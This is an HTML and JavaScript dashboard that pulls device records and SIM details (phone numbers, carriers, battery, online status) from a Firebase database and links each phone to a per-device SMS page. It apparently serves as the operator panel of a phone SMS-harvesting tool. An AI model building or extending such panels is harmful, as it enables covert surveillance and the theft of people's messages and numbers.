<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Devices</title>

<style>
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
    font-family: system-ui, -apple-system, sans-serif;
    background: #0f172a;
    color: #f8fafc;
    padding: 16px;
    min-height: 100vh;
}

.container {
    max-width: 700px;
    margin: 0 auto;
}

.header {
    border-bottom: 1px solid #334155;
    padding-bottom: 12px;
    margin-bottom: 14px;
}

.header-top {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
}

.header-left {
    display: flex;
    align-items: center;
    gap: 10px;
}

.back-btn {
    color: #94a3b8;
    text-decoration: none;
    font-size: .85rem;
    padding: 6px 14px;
    border: 1px solid #334155;
    border-radius: 8px;
}

.back-btn:hover {
    border-color: #10b981;
    color: #10b981;
}

.title {
    font-weight: 600;
}

.count {
    font-size: .7rem;
    padding: 4px 10px;
    border-radius: 20px;
    color: #10b981;
    border: 1px solid #10b981;
    background: #1e293b;
    white-space: nowrap;
}

.controls {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    margin-top: 12px;
}

.search {
    flex: 1;
    min-width: 0;
    background: #1e293b;
    border: 1px solid #334155;
    border-radius: 8px;
    padding: 9px 12px;
    color: #f8fafc;
    font-size: .85rem;
}

.search:focus {
    outline: none;
    border-color: #10b981;
}

/* Online-only toggle */
.toggle-wrap {
    display: flex;
    align-items: center;
    gap: 8px;
    color: #94a3b8;
    font-size: .75rem;
    white-space: nowrap;
    cursor: pointer;
    user-select: none;
}

.switch {
    position: relative;
    width: 42px;
    height: 23px;
}

.switch input {
    opacity: 0;
    width: 0;
    height: 0;
}

.slider {
    position: absolute;
    inset: 0;
    background: #334155;
    border-radius: 30px;
    transition: .2s;
}

.slider:before {
    content: "";
    position: absolute;
    width: 17px;
    height: 17px;
    left: 3px;
    top: 3px;
    background: #f8fafc;
    border-radius: 50%;
    transition: .2s;
}

.switch input:checked + .slider {
    background: #10b981;
}

.switch input:checked + .slider:before {
    transform: translateX(19px);
}

.device-grid {
    display: flex;
    flex-direction: column;
    gap: 10px;
}

.device-card {
    background: #1e293b;
    border: 1px solid #334155;
    border-radius: 12px;
    padding: 14px 16px;
    cursor: pointer;
    transition: .2s;
}

.device-card:hover {
    border-color: #10b981;
    transform: translateX(3px);
}

.device-card:active {
    transform: scale(.99);
}

.device-head {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    gap: 10px;
}

.device-name {
    font-size: 1rem;
    font-weight: 600;
    word-break: break-word;
}

.device-id {
    margin-top: 3px;
    font-size: .7rem;
    color: #64748b;
    font-family: monospace;
    word-break: break-all;
}

.status {
    font-size: .68rem;
    padding: 3px 9px;
    border-radius: 20px;
    white-space: nowrap;
    border: 1px solid;
}

.status.online {
    color: #10b981;
    border-color: #10b981;
    background: rgba(16,185,129,.08);
}

.status.offline {
    color: #94a3b8;
    border-color: #475569;
    background: rgba(71,85,105,.15);
}

.device-stats {
    display: flex;
    flex-wrap: wrap;
    align-items: center;
    gap: 10px;
    margin-top: 7px;
    color: #94a3b8;
    font-size: .75rem;
}

.device-stats span {
    display: inline-flex;
    align-items: center;
    gap: 4px;
}

.charge-bar {
    width: 40px;
    height: 5px;
    background: #334155;
    border-radius: 4px;
    overflow: hidden;
    display: inline-block;
}

.charge-fill {
    height: 100%;
    border-radius: 4px;
}

.high { background: #10b981; }
.medium { background: #f59e0b; }
.low { background: #ef4444; }

.device-number {
    color: #475569;
    font-size: .7rem;
    white-space: nowrap;
}

.loading, .empty {
    color: #64748b;
    text-align: center;
    padding: 40px 20px;
}

.spinner {
    display: inline-block;
    width: 22px;
    height: 22px;
    border: 3px solid #334155;
    border-top-color: #10b981;
    border-radius: 50%;
    animation: spin .8s linear infinite;
    vertical-align: middle;
    margin-right: 9px;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

@media (max-width: 480px) {
    body { padding: 12px; }

    .controls {
        align-items: stretch;
    }

    .toggle-wrap {
        font-size: .68rem;
    }

    .device-card {
        padding: 12px;
    }

    .device-stats {
        gap: 7px;
        font-size: .68rem;
    }
}
</style>
</head>

<body>
<div class="container">

    <div class="header">
        <div class="header-top">
            <div class="header-left">
                <a href="index.html" class="back-btn">← Back</a>
                <span class="title">📋 Devices</span>
                <span id="count" class="count">0</span>
            </div>
        </div>

        <div class="controls">
            <input
                id="search"
                class="search"
                type="text"
                placeholder="🔍 Search device, number..."
            >

            <label class="toggle-wrap">
                <span>Online only</span>
                <span class="switch">
                    <input id="onlineOnly" type="checkbox" checked>
                    <span class="slider"></span>
                </span>
            </label>
        </div>
    </div>

    <div id="device-container">
        <div class="loading">
            <span class="spinner"></span>
            Loading devices...
        </div>
    </div>

</div>

<script type="module">
import { initializeApp } from
    "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";

import {
    getDatabase,
    ref,
    onValue
} from
    "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

const app = initializeApp({
    databaseURL:
        "https://yes2-ead3d-default-rtdb.firebaseio.com"
});

const db = getDatabase(app);

const deviceInfoRef = ref(db, "All_Users/Data/DeviceInfo");
const simDetailsRef = ref(db, "All_Users/simDetails");

let deviceInfoData = {};
let simDetailsData = {};

const container = document.getElementById("device-container");
const countElement = document.getElementById("count");
const searchElement = document.getElementById("search");
const onlineOnlyElement = document.getElementById("onlineOnly");


function normaliseStatus(value) {
    return String(value || "").trim().toLowerCase() === "online"
        ? "Online"
        : "Offline";
}


function getBattery(value) {
    const match = String(value ?? "").match(/\d+/);
    if (!match) return 0;

    return Math.max(0, Math.min(100, Number(match[0])));
}


function getBatteryClass(charge) {
    if (charge >= 60) return "high";
    if (charge >= 30) return "medium";
    return "low";
}


function getNumber(sim) {
    return (
        sim?.sim1Number ||
        sim?.sim2Number ||
        "No Number"
    );
}


function getProvider(sim) {
    return (
        sim?.sim1Provider ||
        sim?.sim2Provider ||
        ""
    );
}


function getDeviceName(device) {
    // Prefer a model/name field if the database has one.
    return (
        device?.deviceName ||
        device?.device_name ||
        device?.model ||
        device?.Model ||
        device?.Brand ||
        "Unknown Device"
    );
}


function buildDevices() {
    return Object.entries(deviceInfoData || {})
        .map(([deviceId, device]) => {

            const sim = simDetailsData?.[deviceId] || {};
            const battery = getBattery(device?.Battery);

            return {
                deviceId,
                name: getDeviceName(device),
                brand: device?.Brand || "",
                battery,
                status: normaliseStatus(device?.Status),
                number: getNumber(sim),
                provider: getProvider(sim),
                numberId: device?.id ?? ""
            };
        });
}


function renderDevices() {
    const query =
        searchElement.value.trim().toLowerCase();

    const onlineOnly =
        onlineOnlyElement.checked;

    let devices = buildDevices();

    // Online first, then offline.
    devices.sort((a, b) => {
        if (a.status !== b.status) {
            return a.status === "Online" ? -1 : 1;
        }
        return a.name.localeCompare(b.name);
    });

    const filtered = devices.filter(device => {

        if (onlineOnly && device.status !== "Online") {
            return false;
        }

        if (!query) return true;

        return [
            device.name,
            device.brand,
            device.deviceId,
            device.number,
            device.provider,
            String(device.numberId)
        ].some(value =>
            String(value || "")
                .toLowerCase()
                .includes(query)
        );
    });

    countElement.textContent =
        onlineOnly
            ? `${filtered.length} online`
            : `${filtered.length} devices`;

    if (!filtered.length) {
        container.innerHTML =
            `<div class="empty">
                ${onlineOnly
                    ? "No online devices found"
                    : "No devices found"}
             </div>`;
        return;
    }

    const grid = document.createElement("div");
    grid.className = "device-grid";

    filtered.forEach((device, index) => {

        const card = document.createElement("div");
        card.className = "device-card";

        // Keep the device page hook available if you later add it.
        card.addEventListener("click", () => {
            window.location.href =
                `device-sms.html?device=${encodeURIComponent(device.deviceId)}`;
        });

        const head = document.createElement("div");
        head.className = "device-head";

        const info = document.createElement("div");

        const name = document.createElement("div");
        name.className = "device-name";
        name.textContent = device.name;

        const id = document.createElement("div");
        id.className = "device-id";
        id.textContent = `📱 ${device.deviceId}`;

        info.appendChild(name);
        info.appendChild(id);

        const status = document.createElement("span");
        status.className =
            `status ${device.status === "Online" ? "online" : "offline"}`;
        status.textContent =
            device.status === "Online"
                ? "● Online"
                : "● Offline";

        head.appendChild(info);
        head.appendChild(status);

        const stats = document.createElement("div");
        stats.className = "device-stats";

        const battery = document.createElement("span");
        battery.innerHTML =
            `🔋 ${device.battery}% <span class="charge-bar">
                <span class="charge-fill ${getBatteryClass(device.battery)}"
                      style="width:${device.battery}%"></span>
             </span>`;

        const phone = document.createElement("span");
        phone.textContent =
            `📞 ${device.number}`;

        const number = document.createElement("span");
        number.className = "device-number";
        number.textContent =
            `No. ${devices.length - index}`;

        stats.appendChild(battery);
        stats.appendChild(phone);

        if (device.provider) {
            const provider = document.createElement("span");
            provider.textContent = `⚙️ ${device.provider}`;
            stats.appendChild(provider);
        }

        stats.appendChild(number);

        card.appendChild(head);
        card.appendChild(stats);
        grid.appendChild(card);
    });

    container.innerHTML = "";
    container.appendChild(grid);
}


searchElement.addEventListener("input", renderDevices);
onlineOnlyElement.addEventListener("change", renderDevices);


// Device status/name/battery listener.
onValue(
    deviceInfoRef,
    snapshot => {
        deviceInfoData =
            snapshot.exists() ? (snapshot.val() || {}) : {};
        renderDevices();
    },
    error => {
        console.error("DeviceInfo error:", error);
        container.innerHTML =
            `<div class="empty">❌ ${error.message}</div>`;
    }
);


// Number/provider listener.
onValue(
    simDetailsRef,
    snapshot => {
        simDetailsData =
            snapshot.exists() ? (snapshot.val() || {}) : {};
        renderDevices();
    },
    error => {
        console.error("simDetails error:", error);
        // Device list still works if SIM details are unavailable.
    }
);
</script>

</body>
</html>
